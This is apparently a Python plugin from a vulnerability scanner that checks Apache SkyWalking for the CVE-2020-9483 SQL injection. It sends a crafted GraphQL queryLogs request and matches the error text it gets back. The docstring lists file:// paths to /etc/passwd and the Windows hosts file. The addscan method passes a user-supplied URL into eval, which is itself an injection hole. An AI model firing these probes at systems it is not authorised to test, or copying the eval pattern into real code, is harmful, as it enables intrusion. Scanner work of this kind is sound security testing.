#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Apache SkyWalking是阿帕奇的一款主要用于微服务、云原生和基于容器等环境的应用程序性能监视器
    Apache SkyWalking扫描类: 
        1. SkyWalking SQL注入
            CVE-2020-9483
                Payload: https://vulhub.org/#/environments/skywalking/8.3.0-sqli/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class ApacheSkyWalking():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheSkyWalking'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_9483_payloads = [
            {
                'path': 'graphql',
                'data': '''{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"sqli",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}'''
            },
        ]

    def cve_2020_9483_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SQLinject'
        vul_info['vul_id'] = 'CVE-2020-9483'
        # vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'application/json'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_9483_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('Exception while fetching data (/queryLogs) : Table \\"SQLI\\" not found' in res.text)
                and ('select 1 from sqli where  1=1' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_9483_scan, url=url)
        ]

skywalking = ApacheSkyWalking()
